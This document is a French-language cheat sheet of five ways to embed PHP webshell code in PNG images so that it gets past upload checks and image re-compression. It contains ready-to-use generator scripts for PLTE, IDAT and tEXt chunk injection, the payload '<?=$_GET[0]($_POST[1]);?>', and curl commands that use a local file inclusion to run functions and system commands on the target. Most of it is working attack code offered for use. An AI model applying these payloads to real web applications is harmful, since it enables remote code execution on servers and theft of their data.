Résumé des principales techniques en plus concis.

Voir : 
- https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/
- https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there

## Généralités 

Prérequis : 

    sudo apt-get install php-cli
    php -v
    sudo apt-get install php8.2-gd 
    php mon_script.php

Astuces : 

- Ne surtout pas mettre de quotes dans les arguments de fonctions lorsque l'on utilise des payloads du type "\<?=$_GET\[0](\$_POST[1]);?>" puisque le contenu passe déjà par une variabilisation.

- La fonction phpinfo() est à faire en priorité pour avoir tous les chemins, toutes les fonctions interdites, etc. Bien passer le paramètre -1 pour que la sortie soit exhaustive.


## Méthode 1 : Commentaire EXIF

Méthode qui permet de contourner une vérification qui ne se fait que sur le contenu de l'image et pas forcément sur le nom : 

    exiftool -comment="<?php phpinfo(); ?>" image.png
    mv image.png image.php
    
Cette méthode implique qu'il n'y ait pas de processing côté serveur.


## Méthode 2 : Concaténation 

Même principe que la 1 mais avec une insertion directe à la fin du fichier : 

    echo '<?php phpinfo(); ?>' >> image.png
    mv image.png image.php
    
## Méthode 3 : PLTE 

Méthode permettant de contourner les compressions de type PHP-GD.

    php plte.php '<?php phpinfo(); ?>' image.php

L'image doit aussi avoir une extension PHP mais résistera à la compression.

Source du script plte.php : 

    <?php
    if(count($argv) != 3) exit("Usage $argv[0] <PHP payload> <Output file>");

    $_payload = $argv[1];
    $output = $argv[2];

    while (strlen($_payload) % 3 != 0) { $_payload.=" "; }

    $_pay_len=strlen($_payload);
    if ($_pay_len > 256*3){
        echo "FATAL: The payload is too long. Exiting...";
        exit();
    }
    if($_pay_len %3 != 0){
        echo "FATAL: The payload isn't divisible by 3. Exiting...";
        exit();
    }

    $width=$_pay_len/3;
    $height=20;
    $im = imagecreate($width, $height);

    $_hex=unpack('H*',$_payload);
    $_chunks=str_split($_hex[1], 6);

    for($i=0; $i < count($_chunks); $i++){
        $_color_chunks=str_split($_chunks[$i], 2);
        $color=imagecolorallocate($im, hexdec($_color_chunks[0]), hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));
        imagesetpixel($im,$i,1,$color);
    }

    imagepng($im,$output); 
    ?>


## Méthode 4 : IDAT chunks
 
Méthode plus compliquée mais permettant à la fois de résister au processing et d'avoir une image à l'extension PNG.

    php idat.php

Script **idat.php** utilisé pour injecter le payload "<?=$_GET[0]($_POST[1]);?>" dans une image : 

	 <?php
	    header('Content-Type: image/png');

	    $p = array(0xA3, 0x9F, 0x67, 0xF7, 0x0E, 0x93, 0x1B, 0x23, 0xBE, 0x2C, 0x8A, 0xD0, 0x80, 0xF9, 0xE1, 0xAE, 0x22, 0xF6, 0xD9, 0x43, 0x5D, 0xFB, 0xAE, 0xCC, 0x5A, 0x01, 0xDC, 0xAA, 0x52, 0xD0, 0xB6, 0xEE, 0xBB, 0x3A, 0xCF, 0x93, 0xCE, 0xD2, 0x88, 0xFC, 0x69, 0xD0, 0x2B, 0xB9, 0xB0, 0xFB, 0xBB, 0x79, 0xFC, 0xED, 0x22, 0x38, 0x49, 0xD3, 0x51, 0xB7, 0x3F, 0x02, 0xC2, 0x20, 0xD8, 0xD9, 0x3C, 0x67, 0xF4, 0x50, 0x67, 0xF4, 0x50, 0xA3, 0x9F, 0x67, 0xA5, 0xBE, 0x5F, 0x76, 0x74, 0x5A, 0x4C, 0xA1, 0x3F, 0x7A, 0xBF, 0x30, 0x6B, 0x88, 0x2D, 0x60, 0x65, 0x7D, 0x52, 0x9D, 0xAD, 0x88, 0xA1, 0x66, 0x94, 0xA1, 0x27, 0x56, 0xEC, 0xFE, 0xAF, 0x57, 0x57, 0xEB, 0x2E, 0x20, 0xA3, 0xAE, 0x58, 0x80, 0xA7, 0x0C, 0x10, 0x55, 0xCF, 0x09, 0x5C, 0x10, 0x40, 0x8A, 0xB9, 0x39, 0xB3, 0xC8, 0xCD, 0x64, 0x45, 0x3C, 0x49, 0x3E, 0xAD, 0x3F, 0x33, 0x56, 0x1F, 0x19 );

	    $img = imagecreatetruecolor(110, 110);

	    for ($y = 0; $y < sizeof($p); $y += 3) {
	    $r = $p[$y];
	    $g = $p[$y+1];
	    $b = $p[$y+2];
	    $color = imagecolorallocate($img, $r, $g, $b);
	    imagesetpixel($img, round($y / 3)*2, 0, $color);
	    imagesetpixel($img, round($y / 3)*2+1, 0, $color);
	    imagesetpixel($img, round($y / 3)*2, 1, $color);
	    imagesetpixel($img, round($y / 3)*2+1, 1, $color);
	    }

	    imagepng($img);
	  ?>
        
Exemples d'exploitation avec une LFI : 

    curl -XPOST -d '1=-1' 'http://site?page=../upload/xyz.png&0=phpinfo' --output phpinfo
    
    curl -XPOST -d "1=pages/index.php" 'http://site?page=../upload/xyz.png&0=file_get_contents' --output index
    
    curl -XPOST -d '1=id' 'http://site?page=../upload/xyz.png&0=phpinfo' --output exec
    
    
## Méthode 5 : tEXt chunks

Méthode qui est un peu une version améliorée de la n°1 mais spécifique à Imagick.

    php tEXt.php 'image.png' '<?php phpinfo(); ?>' ‘image.php’
    
Source du script tEXt.php :

    <?php
    if(count($argv) != 4) exit("Usage $argv[0] <Input file> <PHP payload> <Output file>");

    $input = $argv[1];
    $_payload = $argv[2];
    $output = $argv[3];

    $imgck = new Imagick($input);
    $imgck->setImageProperty("Abcde", $_payload);
    $imgck->writeImage($output);
    ?>
